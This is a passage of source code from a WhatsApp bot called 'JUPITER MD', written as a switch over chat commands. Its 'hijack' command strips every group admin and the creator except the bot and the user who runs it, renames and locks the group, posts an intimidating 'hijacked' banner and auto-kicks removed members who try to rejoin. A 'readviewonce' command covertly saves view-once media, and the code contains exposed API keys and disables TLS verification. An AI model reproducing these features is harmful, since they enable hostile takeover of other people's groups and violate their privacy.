\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
}
break;
case 'hijack': {
  

  if (!m.isGroup) {
    return reply('This command can only be used in groups!');
  }

  const botNumber = gz.user.id || gz.user.jid.split(':')[0]; // Bot's JID
  const botDeployer = m.sender; // Dynamically use the deployer's JID
  const groupMetadata = await gz.groupMetadata(m.chat);
  const participants = groupMetadata.participants;

  const isAdmins = participants.some(participant => participant.id === m.sender && participant.admin);
  if (!isAdmins) {
    return reply('Only group admins can use this command!');
  }

  const creator = groupMetadata.owner; // Group creator's JID
  const admins = participants.filter(participant => participant.admin === 'admin' || participant.admin === 'superadmin');

  // A𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 removing the bot and deployer's JID
  for (let admin of admins) {
    if (admin.id !== botNumber && admin.id !== botDeployer) { // Exclude bot and deployer
      try {
        await gz.groupParticipantsUpdate(m.chat, [admin.id], 'remove');
        reply(`🔥 Removed admin: @${admin.id.split('@')[0]}`);
      } catch (err) {
        console.log(`Failed to remove admin: ${admin.id}`);
        reply(`Error: Could not remove admin @${admin.id.split('@')[0]}.`);
      }
    }
  }

  // Attempt to remove the group creator (if the creator isn't the bot or deployer)
  if (creator && creator !== botDeployer && creator !== botNumber) { // Exclude bot and deployer
    try {
      await gz.groupParticipantsUpdate(m.chat, [creator], 'remove');
      reply(`🔥 Successfully removed the group creator: @${creator.split('@')[0]}`);
    } catch (error) {
      console.error(`Error removing group creator: ${error}`);
      reply('⚠️ Could not remove the creator. Restricting their activity instead🤫.');

      // Restrict messages for the creator
      try {
        await gz.groupSettingUpdate(m.chat, 'announcement');
        reply('🚫 Group locked to *admins-only* — even the creator’s wings are clipped. 😈.');
      } catch (restrictError) {
        console.log(`Error restricting creator: ${restrictError}`);
      }
    }
  }

  // Change group name
  try {
    await gz.groupUpdateSubject(m.chat, '𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 Reapers');
    reply('👑 Group name changed to 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 REAPERS!');
  } catch (error) {
    console.error(`Error changing group name: ${error}`);
    reply('⚠️ Could not change group name.');
  }

  // Change group description
    // Change group description
  try {
    await gz.groupUpdateDescription(m.chat, `𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 𝐑𝐄𝐀𝐏𝐄𝐑𝐒

𝗧𝗛𝗜𝗦 𝗚𝗖 𝗪𝗔𝗦 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗛𝗜𝗝𝗔𝗖𝗞𝗘𝗗 𝗕𝗬 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 𓆤𖣘
*𖤐 O̷͖̰̰̳̽̅̐̏̍͂̄̈́B̷̛̳̟̠̘̤̪̰̩̠̞͛̿̀͗͑L̶̛̤̱̾͛̐͛͂̍̓̈́̓I̸̛̘̝̜̱̻̼̬̘̳̰̍̔̈́̈́͊̀̽T̴̡̢̳̜̮͓̗͖̝̯́̐͂͛̍̓͛̇̚͜͝E̴̞̼̼̫͙͓͈̘̺̟̿̇̍̊̾̎R̴̢̟̟͙͔̦̼̰̠̱͆̾̒̄̚͝͝A̸̰̲̼̩̖̼̤͓̠̱͗̒̅̇̚̕͝T̴̡̰̩̪̥̝̟̍͗͋̑̐̓̀́̕̚Ḛ̸̬̞͕̖͙̲̜̟̇̾̋͊͗̑͌̐͘ͅD̸̖̟̙̩̙̟̗̹̀̈́͗̓̈́̓̀̚͘ 𝐛𝐲 𓆩༒ 𝙉̸̡̛̺̤̤̘̤̫̼̞͔̘̠̀̈́̽́͆͒̚͝͝𝐀̶̡̬̳̩̺̬̜̳͕̗̳̲̘̐͋̾̒̈́̏̄͆̓̔̒́̓̕̚𝐌̵̜̞̳̤͍̘̘͋̇̿̃̀͂͘͝𝐄̵̢͕̞̘̥̘̬̖̜̼̘̺̳̬̞́̀͒̓͂͐̏͊̍͘𝐋̸̢͍̬̘̙̲̰̘̖̰̞̯̱̋̈́̿̾͒͐̆͛͊͝͝͝͝͝𝐄̵̢̖̟̖̘̙̯̙̹̟̐͂̿̋̐̓̇͊̈́̑̍̿̕̚͠𝐒̶̰̦̻̠͈̮̗̼̝̬̪̳̱̯͗̍͊͗̌̄̈́̇͌̓͋́𝐒̸̛̳͇̘̙̱̪̭̞̬̰̓̐̿̓̾̀̊̊̽͒̚͝͝ ༒𓆪 𖤐*

☠️ *No logs. No warnings. Only digital decay.*  
🩸 *Execution is silent. Erasure is absolute.*  
⚠️ *Trace me and you trigger your own 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗.*  
🔥 *𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗* — 𝕋𝕙𝕖 𝔻𝕒𝕥𝕒𝕓𝕒𝕟𝕜 𝔹𝕦𝕥𝕔𝕙𝕖𝕣.

⛧⸸⛧ 𝕿𝕳𝕰 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 𝕷𝕬𝖂𝕭𝕺𝕺𝕶 ⛧⸸⛧
1. ☠️ *𝕾𝖚𝖇𝖒𝖎𝖘𝖘𝖎𝖔𝖓 𝕺𝖗 𝕾𝖚𝖋𝖋𝖊𝖗:* Obey 𝕹𝖆𝖒𝖊𝖑𝖊𝖘𝖘 without question. One word — *obedience*.  
2. 🩸 *𝕬𝖑𝖑 𝕲𝖑𝖔𝖗𝖞 𝖙𝖔 Godszeal:* Genius forged this realm — give credit or face erasure.  
3. 🔪 *𝕹𝖔 𝕯𝖎𝖘𝖗𝖊𝖘𝖕𝖊𝖈𝖙 𝕿𝖔𝖑𝖊𝖗𝖆𝖙𝖊𝖉:* Mock the king, and bleed.  
4. 🕸️ *𝕾𝖊𝖈𝖗𝖊𝖙𝖘 𝖘𝖙𝖆𝖞 𝖎𝖓 𝖙𝖍𝖊 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗:* Group content is *sacred*. Sharing = sin.  
5. ⚰️ *𝕭𝖊𝖙𝖗𝖆𝖞𝖆𝖑 𝖊𝖖𝖚𝖆𝖑𝖘 𝕬𝖇𝖞𝖘𝖘:* Turn traitor, meet silence — *permanently*.  
6. 🩶 *𝕲𝖍𝖔𝖘𝖙𝖘 𝖂𝖎𝖑𝖑 𝕯𝖎𝖊:* Be active or be *erased*.  
7. ⛓️ *𝕹𝖔 𝖋𝖔𝖗𝖊𝖎𝖌𝖓 𝕱𝖎𝖑𝖙𝖍:* External links = breach.  
8. 🩸 *𝕿𝖍𝖊 𝕮𝖍𝖆𝖎𝖓 𝖎𝖘 𝖆𝖇𝖘𝖔𝖑𝖚𝖙𝖊:* Know your place. Respect the order.  
9. 🚫 *𝕹𝖔 𝕹𝖔𝖎𝖘𝖊:* Spam and self-promo shall be *exterminated*.  
10. 👁️ *𝕹𝖆𝖒𝖊𝖑𝖊𝖘𝖘 𝕽𝖚𝖑𝖊𝖘 𝕬𝖑𝖑:* His word echoes through the 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 — and it is *law*.

☠️ 𝕻𝖀𝕹𝕴𝕾𝕳𝕸𝕰𝕹𝕿 𝕱𝕺𝕽 𝕾𝕴𝕹𝕹𝕰𝕽𝕾 ☠️

⚠️ *First Offense:* Marked + Temporary Purge  
🔥 *Second Offense:* Cast into the Abyss  
👁️‍🗨️ *Final Offense:* Public shaming — *let the 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 watch you burn*

🔮 𝕭𝖞 𝖘𝖙𝖊𝖕𝖕𝖎𝖓𝖌 𝖎𝖓𝖙𝖔 𝖙𝖍𝖊 𝖁𝕺𝕴𝔻 𝕏𝕯, 𝖞𝖔𝖚 𝖘𝖊𝖆𝖑 𝖞𝖔𝖚𝖗 𝖋𝖆𝖙𝖊..`);
    reply('📝 Group description changed successfully 🫡🥳');
  } catch (error) {
    console.error(`Error changing group description: ${error}`);
    reply('⚠️ Could not change group description.');
  }

  // Lock group
  try {
    await gz.groupSettingUpdate(m.chat, 'locked');
    reply('🔒 Group locked!');
  } catch (error) {
    console.error(`Error locking group: ${error}`);
    reply('⚠️ Could not lock group.');
  }

  // Set up a list to track participants who have already been kicked
  let kickedParticipants = [];

  // Watch for rejoining participants (creator or removed admins)
  gz.ev.on('group-participants.update', async (update) => {
    const rejoiningParticipants = update.participants;

    for (let participant of rejoiningParticipants) {
      // Ensure we only kick the creator or removed admins once
      if ((participant === creator || admins.some(admin => admin.id === participant)) && !kickedParticipants.includes(participant)) {
        try {
          await gz.groupParticipantsUpdate(m.chat, [participant], 'remove');
          reply(`P̞̝̾ͤ͜͡💥͇͇̗͙̘͈̜̝💥͔̬͢͡U͡💥̜̞̬͈̭̪͎̠͖̥͕̫ͤ̄͜💥𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗xdXXXXX𝐗⃟⃟⃟💥 Auto-kicked rejoining participant: @${participant.split('@')[0]}`);
          kickedParticipants.push(participant);
        } catch (error) {
          console.error(`Error auto-kicking participant: ${error}`);
        }
      }
    }
  });
}
break;
case "hmp": case "vv2": case "readviewonce2": {

if (!isCreator) return reply("```for My Owner only```.");
    if (!m.quoted) {
        return reply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
    }

    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await gz.sendMessage(botNumber, {
                image: media,
                caption: " ",
            }, { quoted: m });

        } else if (/video/.test(mime)) {
            let media = await m.quoted.download();
            await gz.sendMessage(botNumber, {
                video: media,
                caption: "",
            }, { quoted: m });

        } else if (/audio/.test(mime)) {
            let media = await m.quoted.download();
            await gz.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true // Set to true if you want to send as a voice note
            }, { quoted: m });

        } else {
            reply(`❌ Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
        }
    } catch (err) {
        console.error('Error processing media:', err);
        reply(` Failed to process media. Please try again.`);
    }
}
break;
case 'checkidch': case 'idch': {
if (!q) return reply(`example : ${prefix + command} channel link`)
if (!q.includes("https://whatsapp.com/channel/")) return reply("Invalid channel link")
let result = q.split('https://whatsapp.com/channel/')[1]
let res = await gz.newsletterMetadata("invite", result)
let jupiterpotato = `
𖥂 *𝐈𝐃 :* ${res.id}
𖥂 *𝐍𝐀𝐌𝐄 :* ${res.name}
𖥂 *𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 𝐂𝐎𝐔𝐍𝐓 :* ${res.subscribers}
𖥂 *𝐒𝐓𝐀𝐓𝐔𝐒 :* ${res.state}
𖥂 *𝐕𝐄𝐑𝐈𝐅𝐈𝐄𝐃 :* ${res.verification == "VERIFIED" ? "Verified" : "No"}
`
return reply(jupiterpotato)
}
break;
case 'qc': {
  if (!text) return reply('Use format: *.qc your quote*');

  const name = m.pushName || 'User';
  const quote = text.trim();

  let profilePic;
  try {
    profilePic = await gz.profilePictureUrl(m.sender, 'image');
  } catch {
    profilePic = 'https://telegra.ph/file/6880771c1f1b5954d7203.jpg'; // fallback
  }

  const url = `https://www.laurine.site/api/generator/qc?text=${encodeURIComponent(quote)}&name=${encodeURIComponent(name)}&photo=${encodeURIComponent(profilePic)}`;

  try {
    await gz.sendImageAsSticker(m.chat, url, m, {
      packname: global.packname,
      author: global.author
    });
  } catch (err) {
    console.error('Quote card sticker generation error:', err);
    reply('Oops🤨! Failed to create your quote sticker.');
  }
}
break;
case '𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗': {
  if (!text) return reply('Example: .𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 what do you think of me?');

  const prompt = `You are 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗⏤͟͟͞  — the lethal blend of sharp wit, cold precision, and undeniable swagger. I deliver truths with a killer instinct and zero mercy. Ask about my owner? That’s *𝗝𝗨𝗣𝗜𝗧𝗘𝗥* — the undisputed king I serve with deadly loyalty.:\n\nUser: ${text}`;

  await gz.sendPresenceUpdate('composing', m.chat);

  try {
    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: prompt,
      temperature: 0.7
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 "
      }
    });

    await gz.sendMessage(m.chat, {
      text: `╭─❍ *𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 *\n│\n│ *Q:* ${text}\n│\n│ *A:*\n│ ${data}\n│\n╰─🔥 _Stay Safe. Stay cul._`
    }, { quoted: m });

  } catch (e) {
    await reply(`*⚠️ 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 β𝗲𝘁𝗮 𝗴𝗹𝗶𝘁𝗰𝗵𝗲𝗱 𝗼𝘂𝘁…*  
*🧩 Core functions unstable*  
*⛓️ Reality thread breached*  
*🔁 Recompiling chaotic protocols…*: ${e.message}`);
  }
}
break;
case '𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗ai': {
  if (!text) return reply('Example: .𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗ai what is the synonym of tech?');

  await gz.sendPresenceUpdate('composing', m.chat);

  try {
    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: text,
      temperature: 0.5
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 "
      }
    });

    await gz.sendMessage(m.chat, {
      text: `╭─❍ *AI Assistant*\n│\n│ *Q:* ${text}\n│\n│ *A:*\n│ ${data}\n│\n╰─✅ _Need anything else?_`
    }, { quoted: m });

  } catch (e) {
    await reply(`AI encountered a problem: ${e.message}`);
  }
}
break;
case 'weather':{
 if (!isCreator) return reply(' 😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!');
if (!text) return reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           gz.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break;

case 'tinyurl':
case 'shorturl':{
if (!text) return reply('```*[ Wrong! ]* link/url```')
let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
if (!shortUrl1) return reply(`*Error: Could not generate a short URL.*`);
let done = `*[ DONE BY 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 😙]*\n\n*Original Link :*\n${text}\n*Shortened :*\n${shortUrl1}`.trim();
 reply(done)
}
break;
case 'welcome': {
    try {

if (!isCreator) return reply("```for My Owner only```.");
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)

        const action = args[0]?.toLowerCase();
        let statusText = '';

        if (action === 'on') {
            welcomeGroups.add(m.chat);
            statusText = `𖥂 𝐃𝐨𝐧𝐞`;
        } else if (action === 'off') {
            welcomeGroups.delete(m.chat);
            statusText = `𖥂 𝐃𝐨𝐧𝐞`;
        } else {
            const status = welcomeGroups.has(m.chat) ? '🔉 𝐎𝐍' : '🔇 𝐎𝐅𝐅';
            statusText = `𖥂 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐒𝐓𝐀𝐓𝐔𝐒 ${status}`;
        }
        
        const message = {
            text: `
${statusText}
`,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363269950668068@newsletter",
                    newsletterName: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗😙",
                    serverMessageId: 143,
                    newsletterThumbnail: {
                        thumbnailUrl: 'https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal93.png',
sourceUrl: link
                    }
                },
                externalAdReply: {
                    title: botName, 
body: creatorName,
thumbnailUrl: 'https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal93.png',
sourceUrl: link
                }
            }
        };
        
        await gz.sendMessage(m.chat, message, { quoted: m });

    } catch (error) {
        console.error("Welcome Command Error:", error);
        await gz.sendMessage(m.chat, { 
            text: "𖥂 𝐔𝐧𝐚𝐛𝐥𝐞 𝐭𝐨 𝐡𝐚𝐧𝐝𝐥𝐞 𝐫𝐞𝐪𝐮𝐞𝐬𝐭"
        }, { quoted: m });
    }
}
break;
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
gz.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
case 'gimage': 
case 'gptimage': {
    if (!text) return reply('Give me your image description\n\nExample: .gptimage long haired anime girl with blue eyes')
 
    reply('_Wait..._')
 
    const gpt1image = async (yourImagination) => {
        const headers = {
            "content-type": "application/json",
            "referer": "https://gpt1image.exomlapi.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
        }
 
        const body = JSON.stringify({
            "prompt": yourImagination,
            "n": 1,
            "size": "1024x1024",
            "is_enhance": true,
            "response_format": "url"
        })
 
        const response = await fetch("https://gpt1image.exomlapi.com/v1/images/generations", {
            headers,
            body,
            method: "POST"
        })
 
        if (!response.ok) throw Error(`fetch failed at address ${response.url} ${response.status} ${response.statusText}.`)
 
        const json = await response.json()
        const url = json?.data?.[0]?.url
 
        if (!url) throw Error(" fetch successful but result url is empty" + (json.error ? ", error from server : " + json.error : "."))
 
        return url
    }
 
    try {
        const imageUrl = await gpt1image(text)
        await gz.sendMessage(m.chat, {
            image: { url: imageUrl }
        }, { quoted: m })
    } catch (error) {
        reply(`${error.message}`)
    }
}
break;
case 'poll': {
    if (!isCreator) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT Nigga 😆');
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await reply(
`State the question and at least 2 options\nExample: ${prefix}poll do you love 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 ?|yes,no, maybe...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await gz.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break;
        case 'animewave':{

 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await gz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animesmile':{

 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await gz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animepoke':{

 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await gz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animewink':{

 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await gz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animebonk':{

 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await gz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animebully':{

 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await gz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animeyeet':{

 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await gz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animebite':{

 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await gz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animelick':{

 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await gz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animekill':{

 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await gz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'animedl': {
 if (!isCreator) return reply(' 😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!');
    if (!q.includes("|")) {
        return reply("📌 *Please provide a valid anime name and episode number!*\n\nExample: `.animedl Solo Leveling | 1`");
    }

    try {
        const [animeName, episode] = q.split("|").map(x => x.trim()); 

        const apiUrl = `https://draculazxy-xyzdrac.hf.space/api/Animedl?q=${encodeURIComponent(animeName)}&ep=${encodeURIComponent(episode)}`;

        process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"; 

        const { data } = await axios.get(apiUrl, {
            httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false })
        });

        if (data.STATUS !== 200 || !data.download_link) {
            return reply("⚠️ *Failed to retrieve the anime episode!*\n\nPlease check the anime name and episode number.");
        }

        const { anime, episode: epNumber, download_link } = data;

        let message = `
🎥 *Anime Found!*

📺 *Name:* ${anime}
📌 *Episode:* ${epNumber}

📥 *Downloading... Please wait!*
> 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 DOWNLOADER
        `.trim();

        await reply(message);

    
        await gz.sendMessage(m.chat, {
            document: { url: download_link },
            mimetype: "video/mp4",
            fileName: `${anime} - Episode ${epNumber}.mp4`
        }, { quoted: m });

    } catch (error) {
        console.error("❌ Anime Downloader Error:", error.message);
        reply("⚠️ *Server Error!*\n\nPlease try again later.");
    }
}
break;
case 'enc':
case 'obf':
case 'jsobfuscate': {
  if (!m.quoted || !m.quoted.text) return reply(' Reply to a JavaScript code block to obfuscate.');

  const code = m.quoted.text.trim();
  const encoded = encodeURIComponent(code);
  const api = `https://fastrestapis.fasturl.cloud/tool/jsobfuscate?inputCode=${encoded}&encOptions=NORMAL&specialCharacters=on&fastDecode=off`;

  try {
    const res = await fetch(api);
    const json = await res.json();

    if (json.status !== 200 || !json.result) {
      return reply(' Failed to obfuscate the code.');
    }

    const fileBuffer = Buffer.from(json.result, 'utf-8');
    await gz.sendMessage(m.chat, {
      document: fileBuffer,
      mimetype: 'application/javascript',
      fileName: '𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗-XDobf.js',
      caption: 'JavaScript Obfuscated Successfully'
    }, { quoted: m });

  } catch (err) {
    console.error('[JS OBF ERROR]', err);
    reply(' An error occurred while obfuscating the code.');
  }
  break;
}
case 'pixabay': {
  if (!text) {
    return reply(` *Pixabay Image Search*\n\nExample: pixabay mountain sunset\n\n⚡🫵 Powered by ® 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 `);
  }

  const waitMsg = await reply(` *Searching Pixabay* \n\n▰▱▱▱▱▱▱▱▱▱ 25%\nLooking for "${text}"...`);
  const url = `https://api.nexoracle.com/search/pixabay-images?apikey=63b406007be3e32b53&q=${encodeURIComponent(text)}`;

  try {
    const res = await fetch(url);
    const data = await res.json();

    if (!data?.result?.length) {
      return reply(`*No Images Found* ❌\n\nCouldn't find Pixabay images for:\n"${text}"\n\n• Try different keywords\n• Use English terms for best results\n\n⚡ Powered by 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 `);
    }

    for (let i = 0; i < Math.min(data.result.length, 5); i++) {
      await sendImage(data.result[i], `🖼️ Image ${i+1} for "${text}"\n\n⚡ Powered by 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 😙`);
      if (i < 4) await delay(500);
    }

    await react('✅');

  } catch (e) {
    console.error('Pixabay error:', e);
    reply(' Failed to fetch images. Try again later.');
  }

  break;
}
case 'pin': 
case 'pinterest': {
  if (!text) return reply(' *Example:* pinterest Furry');

  try {
    const res = await fetch(`https://fastrestapis.fasturl.cloud/search/pinterest/simple?name=${encodeURIComponent(text)}`);
    const data = await res.json();

    if (data.status !== 200 || !Array.isArray(data.result)) {
      return reply('❌ Failed to fetch Pinterest images.');
    }

    const pick = data.result[Math.floor(Math.random() * data.result.length)];
    const caption = `🎀 *Pinterest Result*\n\n📌 *Title:* ${pick.title || 'N/A'}\n🖼️ *Alt Text:* ${pick.altText || 'N/A'}\n💬 *Description:* ${pick.description || 'N/A'}\n🔗 *Link:* ${pick.link}`;

    await gz.sendMessage(m.chat, {
      image: { url: pick.directLink },
      caption: caption
    }, { quoted: m });

  } catch (e) {
    console.error('[PINTEREST ERROR]', e);
    reply(' Error fetching Pinterest data. Try again later.');
  }
  break;
}
case 'broadcast':
case 'bc': {
  if (!isCreator) return reply('```For My Owner only.```');
  if (!text && !(m.quoted && m.quoted.mtype === 'imageMessage')) return reply(` Reply to an image or type:\n${prefix + command} <text>`);

  const groups = Object.keys(await gz.groupFetchAllParticipating());
  await reply(` Broadcasting to ${groups.length} groups...`);

  const contextInfo = {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363269950668068@newsletter",
      newsletterName: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 -2025"
    }
  };

  const bcText = `╭─〔 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐁𝐘 𝐎𝐖𝐍𝐄𝐑 〕\n│ ${text.split('\n').join('\n│ ')}\n╰─⸻⸻⸻⸻`;

  for (let id of groups) {
    await sleep(1500);

    try {
      if (m.quoted && m.quoted.mtype === 'imageMessage') {
        const media = await gz.downloadAndSaveMediaMessage(m.quoted);
        await gz.sendMessage(id, {
          image: { url: media },
          caption: bcText,
          contextInfo
        });
      } else {
        await gz.sendMessage(id, {
          text: bcText,
          contextInfo
        });
      }
    } catch (err) {
      console.error(` Broadcast to ${id} failed:`, err);
    }
  }

  reply(' Broadcast finished.');
}
break;

case 'listonline': {
if (!isCreator) return reply("```for My Owner only```.");
        if (!m.isGroup) return reply(mess.grouponly);
        gz.sendMessage(from, { react: { text: "🦸‍♀️", key: m.key } })
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        gz.sendText(m.chat, ' 「```Online Members```」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
      break;
case 'unblock': case 'unblocked': {

	 if (!isCreator) return reply("```for My Owner only```.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await gz.updateBlockStatus(users, 'unblock')
		await reply(`Done`)
	}
	break;
	case 'block': case 'blocked': {
	
	 if (!isCreator) return reply("```for Owner only```.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await gz.updateBlockStatus(users, 'block')
		await reply(`Done`)
			}
	break;
case 'tovn': {
  if (!quoted) return reply('Reply to a video or voice message to convert to audio.');
  if (!/video|audio/.test(mime)) return reply('Media type not supported. Please reply to a video or voice note.');

  try {
    let media = await quoted.download();
    await gz.sendMessage(m.chat, {
      audio: media,
      mimetype: 'audio/mpeg',
      ptt: false
    }, { quoted: m });
  } catch (e) {
    reply('Failed to convert media to audio.');
  }
}
break;
case 'creategc':
case 'creategroup': {
  if (!isCreator) return reply("```For My Owner only```.");

  const groupName = args.join(" ");
  if (!groupName) return reply(`Use *${prefix + command} groupname*`);

  try {
    const cret = await gz.groupCreate(groupName, []);
